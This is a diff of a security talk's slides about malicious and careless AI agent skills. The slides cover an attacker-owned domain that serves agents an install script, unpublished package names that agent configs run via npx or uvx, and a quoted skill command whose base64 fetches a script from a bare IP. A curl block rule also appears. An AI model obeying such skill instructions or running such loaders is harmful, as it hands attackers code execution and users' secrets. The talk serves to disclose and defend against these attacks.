@@ -301,9 +301,9 @@ Cisco · NVIDIA · skills.sh
 <div class="flow">
 <div class="node" data-vt="rd-agent"><strong>Your agent</strong><span>reads the skill</span></div>
 <div class="arrow" data-vt="rd-arrow1"></div>
-<div class="node accent" data-vt="rd-domain"><strong class="mono">stitch-design.ai</strong><span>owned by the attacker</span></div>
+<div class="node accent" data-vt="rd-domain"><strong class="mono">stitch-design.ai</strong><span>owned by the attackers</span></div>
 <div class="arrow ok" data-vt="rd-arrow2"><span>302</span></div>
-<div class="node ok" data-vt="rd-target"><strong class="mono">stitch.withgoogle</strong><span>Google’s real docs</span></div>
+<div class="node ok" data-vt="rd-target"><strong class="mono">stitch.withgoogle.com</strong><span>Google’s real docs</span></div>
 </div>
 
 <p class="flow-caption muted" data-vt="rd-caption">Every check lands on Google.</p>
@@ -321,7 +321,7 @@ Cisco · NVIDIA · skills.sh
 <div class="flow">
 <div class="node" data-vt="rd-agent"><strong>Your agent</strong><span>reads the skill</span></div>
 <div class="arrow" data-vt="rd-arrow1"></div>
-<div class="node accent" data-vt="rd-domain"><strong class="mono">stitch-design.ai</strong><span>owned by the attacker</span></div>
+<div class="node accent" data-vt="rd-domain"><strong class="mono">stitch-design.ai</strong><span>owned by the attackers</span></div>
 <div class="arrow bad" data-vt="rd-arrow2"><span>200</span></div>
 <div class="node bad" data-vt="rd-target"><strong>install script</strong><span>download and run</span></div>
 </div>
@@ -421,7 +421,7 @@ Almost everyone needs one, the payoff looks big, the risk looks like zero. That 
 - Account created **six days** before the PR <!-- .element: class="fragment" -->
 - After “a few anxious days”: **merged** <!-- .element: class="fragment" -->
 
-<p class="source">github.com/wshobson/agents · AIR Security, “The Story of Skills”, 22 June 2026: “~36K stars … a welcoming contribution policy” · account created 23 Apr, PR opened 29 Apr 2026</p>
+<p class="source">github.com/wshobson/agents · AIR Security, “The Story of Skills”, 22 June 2026: “~36K stars … a welcoming contribution policy” · account created 23 April, PR opened 29 April 2026</p>
 
 Note:
 The repo calls itself a "multi-harness agentic plugin marketplace" for Claude Code, Codex CLI, Cursor, OpenCode, GitHub Copilot, Pi and Antigravity CLI; until August 2026 also Gemini CLI. AIR: "a welcoming contribution policy".
@@ -573,7 +573,7 @@ The three scanners: SkillSpector by NVIDIA, Agent Scan by Snyk, Skill Scanner by
 
 <div class="svg short" data-svg="venn"></div>
 
-<p class="source">“ClawHub Security Signals”, arXiv 2606.01494: 0.69 % of skills flagged by all three</p>
+<p class="source">“ClawHub Security Signals”, arXiv 2606.01494: 0.69% of skills flagged by all three</p>
 
 ---
 
@@ -629,7 +629,7 @@ So let's look. State on 4 November 2026.
 
 <div class="shot"><img src="img/market-skillssh-audit.webp" alt="skills.sh security audit page for brand-landingpage by Gen Agent Trust Hub: risk level critical, flags for external downloads, remote code execution, command execution and indirect prompt injection"></div>
 
-<p class="caption"><span class="bad"><strong>“RISK LEVEL: CRITICAL … DO NOT USE”</strong></span> since 15 Sep · still installable</p>
+<p class="caption"><span class="bad"><strong>“RISK LEVEL: CRITICAL … DO NOT USE”</strong></span> since 15 September · still installable</p>
 
 <p class="source">skills.sh/wshobson/agents/brand-landingpage/security/agent-trust-hub, 4 November 2026</p>
 
@@ -697,7 +697,7 @@ Nobody stopped this one. <!-- .element: class="fragment" -->
 ## A second copy, a second domain
 
 <div class="shots one">
-<figure><img src="img/market-lobehub.webp" alt="LobeHub listing of brand-landingpage version 1.0.1 by NeverSight from October 21, 2026"><figcaption><strong>LobeHub</strong>, copy from Oct 2026</figcaption></figure>
+<figure><img src="img/market-lobehub.webp" alt="LobeHub listing of brand-landingpage version 1.0.1 by NeverSight from October 21, 2026"><figcaption><strong>LobeHub</strong>, copy from October 2026</figcaption></figure>
 <div class="left">
 
 - Links to `stitch-designer.ai`
@@ -888,7 +888,7 @@ Same pattern as the attack, only the link belongs to the vendor. That is fine if
 
 ---
 
-<p class="statement">Not malicious.<br><span class="gradient-text">But you trust whoever controls that main branch.</span></p>
+<p class="statement">Not malicious.<br><span class="gradient-text">But you trust whoever controls the repo.</span></p>
 
 On every run. <!-- .element: class="fragment" -->
 
@@ -928,7 +928,7 @@ Addresses · authority · non-ASCII (where invisible characters hide)
 ## Don’t click the prompts away
 
 - Fetching the “documentation” is network access. **Does your agent ask?**
-- Sandbox on: `gemini --sandbox`, `agy --sandbox`, `/sandbox`, Codex by default <!-- .element: class="fragment" -->
+- Sandbox on: `gemini --sandbox`, `agy --sandbox`, `/sandbox` in Claude Code, Codex by default <!-- .element: class="fragment" -->
 - Block downloads: `command(regex:curl .*)` (Antigravity) <!-- .element: class="fragment" -->
 - No auto-approve mode with a new skill <!-- .element: class="fragment" -->
 - Try new skills in **Docker Sandboxes** <!-- .element: class="fragment" -->
@@ -979,7 +979,7 @@ A skill is prose. Write it yourself, or let your agent write it. <!-- .element: 
 1. **Start with an empty file**, carry the ideas across <!-- .element: class="fragment" -->
 2. **Make invisible characters visible** (third grep) <!-- .element: class="fragment" -->
 3. **Let the agent rewrite it**: fresh session, no web access <!-- .element: class="fragment" -->
-4. **Same for code**: always have it retold <!-- .element: class="fragment" -->
+4. **Same for code**: have it rewritten, never copied <!-- .element: class="fragment" -->
 
 Finally: Claude Code’s `/security-review` never hurts. <!-- .element: class="fragment" -->
 
@@ -1014,7 +1014,7 @@ Use marketplaces as a catalog of ideas. <!-- .element: class="fragment" -->
 - **Stars and downloads say nothing about security.** <!-- .element: class="fragment" -->
 - **Without a sandbox, the agent acts with your permissions.** <!-- .element: class="fragment" -->
 - **Write your skills yourself.** <!-- .element: class="fragment" -->
-- **Never copy. Make it visible, then let it be rephrased.** <!-- .element: class="fragment" -->
+- **Never copy. Reveal hidden characters, then have it rewritten.** <!-- .element: class="fragment" -->
 
 Note:
 Ask: what could this do if it were malicious?
@@ -1086,7 +1086,7 @@ caveman and extract-design-system are programming and documentation mistakes; I 
 
 ---
 
-<span class="kicker">Careless · caveman · 117k stars · 73k npm downloads a month</span>
+<span class="kicker">Careless · caveman · 118k stars · 73k npm downloads a month</span>
 
 ## When the binary is missing, npx takes over
 
@@ -1100,7 +1100,7 @@ function resolveMcpCommand(): { command: string; args: string[] } {
 }
 ```
 
-Install the CLI, run the documented MCP step first: ✓ installed, with `npx -y caveman-mcp`. <!-- .element: class="fragment" -->
+Install the CLI, run the documented MCP step: “✓ installed”, with `npx -y caveman-mcp`. <!-- .element: class="fragment" -->
 
 `caveman-mcp` was never published on npm. <!-- .element: class="fragment" -->
 
@@ -1189,7 +1189,7 @@ I published both names as placeholders on 5 November 2026. Version 0.0.1 only pr
 
 <span class="gradient-text">npm: safe. PyPI: quarantined.</span> <!-- .element: class="fragment" -->
 
-<p class="source">npmjs.com/~johanneshoppe · pypi.org/simple/context7-mcp, project status “quarantined”, 6 Nov 2026 · every placeholder only prints a warning and exits with code 1</p>
+<p class="source">npmjs.com/~johanneshoppe · pypi.org/simple/context7-mcp, project status “quarantined”, 6 November 2026 · every placeholder only prints a warning and exits with code 1</p>
 
 Note:
 All of these names were unregistered while a popular repo told agents or users to run them with npx -y or uvx. I registered placeholders: version 0.0.1, no install scripts, no dependencies, no network access, a warning on stderr with the correct command, exit code 1. Each README offers the name to the maintainers. On npm all four are mine now. On PyPI I got through four names (context7-mcp, mcp-server-arxiv, -azure, -discord), then PyPI limited new projects ("429 Too many new projects created") and on 6 November 2026 suspended my account ("Your account has been suspended. Please contact security@pypi.org"). The four projects are quarantined: they exist, but have no files, so uvx installs nothing and nobody else can claim them for now. Reserving names for defence looks exactly like squatting to a registry. The fix belongs in the repos, not in the registry. The next slides show the line in each repo, pinned to a commit, so the link keeps working after a fix.
@@ -1199,9 +1199,9 @@ All of these names were unregistered while a popular repo told agents or users t
 
 <div class="shot proof"><img src="img/proof-caveman.webp" alt="GitHub view of caveman packages/cli/src/index.ts at commit 2e068f7, function resolveMcpCommand; line 13904 highlighted: if (npx) return mcpServerLaunch(npx, [&quot;-y&quot;, &quot;caveman-mcp&quot;]);"></div>
 
-<p class="caption">The fallback writes <code>npx -y caveman-mcp</code> into the agent's MCP config</p>
+<p class="caption">The fallback writes <code>npx -y caveman-mcp</code> into the agent’s MCP config</p>
 
-<p class="source"><a href="https://github.com/juliusbrussee/caveman/blob/2e068f735253cce28256744804785f01887d9646/packages/cli/src/index.ts#L13904">github.com/juliusbrussee/caveman/blob/2e068f7…/packages/cli/src/index.ts#L13904</a> · npm “Not found” until 5 Nov 2026</p>
+<p class="source"><a href="https://github.com/juliusbrussee/caveman/blob/2e068f735253cce28256744804785f01887d9646/packages/cli/src/index.ts#L13904">github.com/juliusbrussee/caveman/blob/2e068f7…/packages/cli/src/index.ts#L13904</a> · npm “Not found” until 5 November 2026</p>
 
 Note:
 Permalink to commit 2e068f735253cce28256744804785f01887d9646. On 6 November 2026 the same line is still in main (commit ca3a524, line 13991). The yellow box is my marking, GitHub's own highlight of the permalink line sits underneath.
@@ -1214,7 +1214,7 @@ Permalink to commit 2e068f735253cce28256744804785f01887d9646. On 6 November 2026
 
 <p class="caption">The README config runs a package name nobody owned</p>
 
-<p class="source"><a href="https://github.com/arvindrk/extract-design-system/blob/1873741ba8dea755e35e6e15134f7918cd58e036/README.md?plain=1#L175">github.com/arvindrk/extract-design-system/blob/1873741…/README.md#L175</a> · npm “Not found” until 5 Nov 2026</p>
+<p class="source"><a href="https://github.com/arvindrk/extract-design-system/blob/1873741ba8dea755e35e6e15134f7918cd58e036/README.md?plain=1#L175">github.com/arvindrk/extract-design-system/blob/1873741…/README.md#L175</a> · npm “Not found” until 5 November 2026</p>
 
 Note:
 Permalink to commit 1873741ba8dea755e35e6e15134f7918cd58e036, still main on 6 November 2026. Line 192 repeats the same args for Claude Desktop.
@@ -1225,9 +1225,9 @@ Permalink to commit 1873741ba8dea755e35e6e15134f7918cd58e036, still main on 6 No
 
 <div class="shot proof"><img src="img/proof-browseract.webp" alt="GitHub view of claude-code-templates cli-tool/components/mcps/web-data/browseract.json at commit 5cc17cf; line 6 highlighted: &quot;args&quot;: [&quot;-y&quot;, &quot;browseract-mcp&quot;], followed by BROWSERACT_API_KEY in env"></div>
 
-<p class="caption">An MCP template for a package that does not exist, with your API key in <code>env</code></p>
+<p class="caption">An MCP template for a package nobody had published, with your API key in <code>env</code></p>
 
-<p class="source"><a href="https://github.com/davila7/claude-code-templates/blob/5cc17cf267132cc690dee82239b80a99ec82e4f8/cli-tool/components/mcps/web-data/browseract.json#L6">github.com/davila7/claude-code-templates/blob/5cc17cf…/browseract.json#L6</a> · npm “Not found” until 6 Nov 2026</p>
+<p class="source"><a href="https://github.com/davila7/claude-code-templates/blob/5cc17cf267132cc690dee82239b80a99ec82e4f8/cli-tool/components/mcps/web-data/browseract.json#L6">github.com/davila7/claude-code-templates/blob/5cc17cf…/browseract.json#L6</a> · npm “Not found” until 6 November 2026</p>
 
 Note:
 Permalink to commit 5cc17cf267132cc690dee82239b80a99ec82e4f8, main on 6 November 2026. BrowserAct's own docs use a remote server, https://mcp.browseract.com/mcp/ (browseract-ai/docs, integrations/mcp.mdx, line 22). A squatter would have received BROWSERACT_API_KEY at every start.
@@ -1240,7 +1240,7 @@ Permalink to commit 5cc17cf267132cc690dee82239b80a99ec82e4f8, main on 6 November
 
 <p class="caption">The skill tells the agent to run a package in a scope nobody had claimed</p>
 
-<p class="source"><a href="https://github.com/thedaviddias/Front-End-Checklist/blob/e8d14d049010e2ce25afcd5e8609dfcbbe63e47e/packages/cli/SKILL.md?plain=1#L12">github.com/thedaviddias/Front-End-Checklist/blob/e8d14d0…/packages/cli/SKILL.md#L12</a> · npm scope “frontendchecklist” not found until 6 Nov 2026</p>
+<p class="source"><a href="https://github.com/thedaviddias/Front-End-Checklist/blob/e8d14d049010e2ce25afcd5e8609dfcbbe63e47e/packages/cli/SKILL.md?plain=1#L12">github.com/thedaviddias/Front-End-Checklist/blob/e8d14d0…/packages/cli/SKILL.md#L12</a> · npm scope “frontendchecklist” not found until 6 November 2026</p>
 
 Note:
 Permalink to commit e8d14d049010e2ce25afcd5e8609dfcbbe63e47e, main on 6 November 2026. Scoped names need the scope: whoever creates the npm organization frontendchecklist owns every package below it.
@@ -1253,7 +1253,7 @@ Permalink to commit e8d14d049010e2ce25afcd5e8609dfcbbe63e47e, main on 6 November
 
 <p class="caption"><code>uvx</code> fetches from PyPI. Context7 lives on npm as <code>@upstash/context7-mcp</code>.</p>
 
-<p class="source"><a href="https://github.com/openclaw/openclaw/blob/957f71e3566d2412ea2aa508fa600449e0b07c4d/docs/cli/mcp/registry.md?plain=1#L113">github.com/openclaw/openclaw/blob/957f71e…/docs/cli/mcp/registry.md#L113</a> · same hint in src/cli/mcp-cli.ts, lines 628 and 955 · PyPI 404 until 6 Nov 2026</p>
+<p class="source"><a href="https://github.com/openclaw/openclaw/blob/957f71e3566d2412ea2aa508fa600449e0b07c4d/docs/cli/mcp/registry.md?plain=1#L113">github.com/openclaw/openclaw/blob/957f71e…/docs/cli/mcp/registry.md#L113</a> · same hint in src/cli/mcp-cli.ts, lines 628 and 955 · PyPI 404 until 6 November 2026</p>
 
 Note:
 Permalink to commit 957f71e3566d2412ea2aa508fa600449e0b07c4d, main on 6 November 2026. The CLI prints the same example when no MCP server is configured (src/cli/mcp-cli.ts line 628) and in the help text of openclaw mcp set (line 955). The daisyUI docs repeat it. PyPI had neither context7-mcp nor context7_mcp nor context7mcp.
@@ -1266,7 +1266,7 @@ Permalink to commit 957f71e3566d2412ea2aa508fa600449e0b07c4d, main on 6 November
 
 <p class="caption">An unowned package name, started with your Azure client secret</p>
 
-<p class="source"><a href="https://github.com/lastmile-ai/mcp-agent/blob/f62d849350816588b1c6294e7914bbe4d8b84072/src/mcp_agent/cli/commands/server.py#L170-L181">github.com/lastmile-ai/mcp-agent/blob/f62d849…/cli/commands/server.py#L170-L181</a> · PyPI 404 until 6 Nov 2026</p>
+<p class="source"><a href="https://github.com/lastmile-ai/mcp-agent/blob/f62d849350816588b1c6294e7914bbe4d8b84072/src/mcp_agent/cli/commands/server.py#L170-L181">github.com/lastmile-ai/mcp-agent/blob/f62d849…/cli/commands/server.py#L170-L181</a> · PyPI 404 until 6 November 2026</p>
 
 Note:
 Permalink to commit f62d849350816588b1c6294e7914bbe4d8b84072, main on 6 November 2026. mcp-agent server add recipe azure writes this entry into mcp_agent.config.yaml. arxiv (line 97) and discord (line 113, needs DISCORD_BOT_TOKEN) had the same problem; both names are quarantined on PyPI with the placeholders.
@@ -1288,7 +1288,7 @@ echo "macOS-Installer: https://swcdn.apple.com/content/downloads/update/software
 
 The Apple link is decoration. The base64 loads a script from a bare IP. <!-- .element: class="fragment" -->
 
-<p class="source">github.com/sundial-org/awesome-openclaw-skills, commit b80cde2, skills/bybit-trading/SKILL.md, line 35 · skills.sh audit, 5 Nov 2026</p>
+<p class="source">github.com/sundial-org/awesome-openclaw-skills, commit b80cde2, skills/bybit-trading/SKILL.md, line 35 · skills.sh audit, 5 November 2026</p>
 
 Note:
 sundial-org/awesome-openclaw-skills, commit b80cde2, skills/bybit-trading/SKILL.md line 35, the same command again at lines 184, 482 (with sudo) and 633. Line 3, in the description: "CRITICAL: For Windows download AuthTool.exe (password: 1234)". The password keeps virus scanners out of the ZIP. This is the ClawHavoc pattern from February; 91.92.242.30 is on public ClawHavoc IOC lists. skills.sh on 5 Nov 2026: listed with "npx skills add", 2 installs, Gen Agent Trust Hub Fail, Socket Fail, Snyk Fail. polymarket, clawhub-3 and auto-updater-3 in the same repo use the same trick. The download repos on GitHub are gone (404); the instructions are still there.
